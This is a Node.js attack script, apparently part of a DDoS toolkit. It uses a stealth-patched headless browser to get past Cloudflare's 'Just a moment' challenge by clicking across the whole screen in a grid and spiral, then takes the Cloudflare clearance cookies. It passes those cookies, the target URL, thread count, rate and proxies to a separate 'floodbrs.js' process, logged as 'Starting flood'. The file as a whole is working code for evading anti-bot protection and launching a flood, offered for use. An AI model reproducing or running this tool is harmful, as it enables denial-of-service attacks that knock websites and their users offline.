const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { spawn, exec } = require('child_process');

puppeteer.use(StealthPlugin());

const COLORS = {
    RED: '\x1b[31m',
    GREEN: '\x1b[32m',
    YELLOW: '\x1b[33m',
    BLUE: '\x1b[34m',
    RESET: '\x1b[0m'
};

// Simple stealth
const applyStealth = async (page) => {
    await page.evaluateOnNewDocument(() => {
        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
        Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3] });
        window.chrome = { runtime: {}, loadTimes: () => ({}) };
        delete window.__webdriver_evaluate;
    });
};

const getBrowserArgs = () => [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage',
    '--disable-blink-features=AutomationControlled',
    '--ignore-certificate-errors',
    '--ignore-ssl-errors',
    '--disable-web-security',
    '--window-size=1920,1080'
];

// FULL SCREEN CLICK SOLVER - CLICKS EVERYWHERE
const solveWithFullScreenClicks = async (page, proxy, targetURL) => {
    log('SOLVER', `Starting full screen click solver for ${maskProxy(proxy)}`, 'BLUE');
    
    await sleep(3);
    
    let title = await page.title().catch(() => '');
    
    if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
        log('SUCCESS', 'Already bypassed!', 'GREEN');
        return { solved: true };
    }

    log('INFO', 'Cloudflare challenge detected', 'YELLOW');

    // Wait for verification
    log('PHASE 1', 'Waiting for verification (10 seconds)', 'BLUE');
    await sleep(10);

    // Check if auto-solved
    title = await page.title().catch(() => '');
    if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
        log('SUCCESS', 'Auto-verification successful!', 'GREEN');
        return { solved: true };
    }

    // FULL SCREEN CLICKING STRATEGY
    log('PHASE 2', 'Starting full screen clicking', 'BLUE');
    
    const viewport = page.viewport();
    const width = viewport.width;
    const height = viewport.height;
    
    log('DEBUG', `Screen size: ${width}x${height}`, 'YELLOW');

    // Define grid density - adjust based on need
    const gridSizes = [20, 15, 10]; // Start with coarse grid, then finer
    
    for (const gridSize of gridSizes) {
        log('CLICK', `Clicking with ${gridSize}x${gridSize} grid`, 'YELLOW');
        
        const xStep = Math.floor(width / gridSize);
        const yStep = Math.floor(height / gridSize);
        
        let clickedPositions = 0;
        
        // Click every grid position
        for (let x = 50; x < width - 50; x += xStep) {
            for (let y = 50; y < height - 50; y += yStep) {
                try {
                    await page.mouse.click(x, y, { delay: 10 });
                    clickedPositions++;
                    
                    // Check every 10 clicks if solved
                    if (clickedPositions % 10 === 0) {
                        title = await page.title().catch(() => '');
                        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
                            log('SUCCESS', `Solved after ${clickedPositions} clicks!`, 'GREEN');
                            return { solved: true };
                        }
                    }
                    
                    // Small delay between clicks
                    await sleep(0.1);
                    
                } catch (error) {
                    // Continue if click fails
                }
            }
        }
        
        log('INFO', `Completed ${gridSize}x${gridSize} grid - ${clickedPositions} clicks`, 'YELLOW');
        
        // Check after each grid
        title = await page.title().catch(() => '');
        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
            log('SUCCESS', `Solved with ${gridSize}x${gridSize} grid!`, 'GREEN');
            return { solved: true };
        }
        
        // Wait a bit before next grid
        await sleep(2);
    }

    // SPIRAL CLICKING PATTERN as last resort
    log('PHASE 3', 'Trying spiral clicking pattern', 'BLUE');
    
    const centerX = width / 2;
    const centerY = height / 2;
    const maxRadius = Math.min(width, height) / 2 - 100;
    
    for (let radius = 0; radius <= maxRadius; radius += 50) {
        for (let angle = 0; angle < 360; angle += 30) {
            const rad = angle * (Math.PI / 180);
            const x = centerX + radius * Math.cos(rad);
            const y = centerY + radius * Math.sin(rad);
            
            if (x > 50 && x < width - 50 && y > 50 && y < height - 50) {
                try {
                    await page.mouse.click(x, y, { delay: 10 });
                    
                    // Check periodically
                    if (radius % 100 === 0 && angle === 0) {
                        title = await page.title().catch(() => '');
                        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
                            log('SUCCESS', `Solved with spiral click!`, 'GREEN');
                            return { solved: true };
                        }
                    }
                    
                    await sleep(0.05);
                } catch (error) {
                    // Continue
                }
            }
        }
    }

    // Final check
    title = await page.title().catch(() => '');
    if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
        log('SUCCESS', 'Challenge solved!', 'GREEN');
        return { solved: true };
    }

    log('ERROR', 'Full screen clicking failed', 'RED');
    return { solved: false };
};

// Extract cookies
const extractCookies = async (page, targetURL) => {
    await sleep(5);
    
    const allCookies = await page.cookies().catch(() => []);
    
    if (allCookies.length === 0) {
        log('COOKIES', 'No cookies found', 'YELLOW');
        return { cookies: '', count: 0, names: [] };
    }

    const cloudflareCookies = allCookies.filter(cookie => 
        cookie.name.includes('cf_') ||
        cookie.name.includes('__cf') ||
        cookie.domain.includes('cloudflare')
    );

    log('COOKIES', `Total cookies: ${allCookies.length}`, 'GREEN');
    
    if (cloudflareCookies.length > 0) {
        const cloudflareNames = cloudflareCookies.map(c => c.name).join(', ');
        log('COOKIES', `Cloudflare cookies: ${cloudflareNames}`, 'BLUE');
        
        const cookieString = cloudflareCookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        return {
            cookies: cookieString,
            count: cloudflareCookies.length,
            names: cloudflareCookies.map(c => c.name)
        };
    } else {
        log('COOKIES', 'No Cloudflare cookies found', 'YELLOW');
        return { cookies: '', count: 0, names: [] };
    }
};

// Command-line
if (process.argv.length < 6) {
    console.log('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
    process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

let successCount = 0;

// Utility functions
const generateRandomString = (length) => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
};

const validKey = generateRandomString(16);

const readProxies = (filePath) => {
    try {
        const proxies = fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
        return [proxies[0]];
    } catch (error) {
        log('ERROR', 'Cannot read proxy file', 'RED');
        return [];
    }
};

const maskProxy = (proxy) => {
    const parts = proxy.split(':');
    if (parts.length >= 2) {
        const ip = parts[0];
        if (ip.split('.').length === 4) {
            return `${ip.split('.')[0]}.${ip.split('.')[1]}.**.**:****`;
        }
    }
    return proxy;
};

const log = (type, message, color = 'RESET') => {
    const colorCode = COLORS[color] || COLORS.RESET;
    console.log(`${colorCode}[${type}] ${message}${COLORS.RESET}`);
};

const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));

const randomElement = (array) => array[Math.floor(Math.random() * array.length)];

// User agents
const userAgents = [
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`
];

// Browser launcher
const launchBrowser = async (targetURL, proxy, attempt = 1) => {
    const userAgent = randomElement(userAgents);
    let browser;

    const options = {
        headless: true,
        args: [
            `--user-agent=${userAgent}`,
            ...getBrowserArgs()
        ],
        defaultViewport: { 
            width: 1920, 
            height: 1080 
        },
        ignoreHTTPSErrors: true
    };

    try {
        log('LAUNCH', `Attempt ${attempt} for ${maskProxy(proxy)}`, 'BLUE');
        
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();

        await applyStealth(page);

        log('NAVIGATE', `Going to: ${targetURL}`, 'BLUE');
        
        await page.goto(targetURL, { 
            waitUntil: 'networkidle0', 
            timeout: 60000 
        }).catch(() => {});

        const solveResult = await solveWithFullScreenClicks(page, proxy, targetURL);
        
        if (!solveResult.solved) {
            throw new Error('Cloudflare challenge failed');
        }

        const cookieResult = await extractCookies(page, targetURL);
        
        successCount++;
        
        if (cookieResult.count > 0) {
            log('SUCCESS', `Solved! Cookies: ${cookieResult.count}`, 'GREEN');
        } else {
            log('WARNING', 'Solved but no cookies found', 'YELLOW');
        }

        await browser.close();

        return {
            cookies: cookieResult.cookies,
            userAgent: userAgent,
            cookieCount: cookieResult.count
        };

    } catch (error) {
        if (browser) await browser.close().catch(() => {});
        
        if (attempt < 3) {
            log('RETRY', `Retrying ${maskProxy(proxy)} (${attempt}/3)`, 'YELLOW');
            await sleep(8);
            return launchBrowser(targetURL, proxy, attempt + 1);
        }
        
        log('FAILED', `${maskProxy(proxy)} - ${error.message}`, 'RED');
        return null;
    }
};

// Main execution
const main = async () => {
    const proxies = readProxies(proxyFile);
    
    if (proxies.length === 0) {
        log('ERROR', 'No proxies found', 'RED');
        process.exit(1);
    }

    log('START', `Target: ${targetURL}`, 'GREEN');
    log('INFO', `Using 1 proxy | Threads: ${threads} | Time: ${duration}s`, 'BLUE');

    const proxy = proxies[0];
    
    try {
        const result = await launchBrowser(targetURL, proxy);
        
        if (result && result.cookies) {
            log('RESULT', `Proxy ${maskProxy(proxy)} - ${result.cookieCount} cookies`, 'GREEN');
            
            try {
                log('FLOOD', `Starting flood with ${threads} threads for ${duration}s`, 'GREEN');
                const floodProcess = spawn('node', [
                    'floodbrs.js',
                    targetURL,
                    duration.toString(),
                    rate,
                    threads.toString(),
                    proxyFile,
                    result.cookies,
                    result.userAgent,
                    validKey
                ], {
                    detached: false,
                    stdio: 'inherit'
                });
                
                floodProcess.on('close', (code) => {
                    log('FLOOD', `Process completed`, 'YELLOW');
                    process.exit(0);
                });
                
            } catch (error) {
                log('ERROR', `Failed to start flood: ${error.message}`, 'RED');
            }
        } else {
            log('ERROR', 'No cookies obtained', 'RED');
        }
    } catch (error) {
        log('ERROR', error.message, 'RED');
    }
};

// Error handling
process.on('uncaughtException', (error) => {
    log('ERROR', error.message, 'RED');
});

process.on('unhandledRejection', (error) => {
    log('ERROR', error.message, 'RED');
});

process.on('SIGINT', () => {
    log('INFO', 'Shutdown signal received', 'YELLOW');
    process.exit(0);
});

log('READY', 'FULL SCREEN CLICK SOLVER - CLICKS EVERYWHERE', 'GREEN');
main().catch(error => {
    log('ERROR', error.message, 'RED');
    process.exit(1);
});
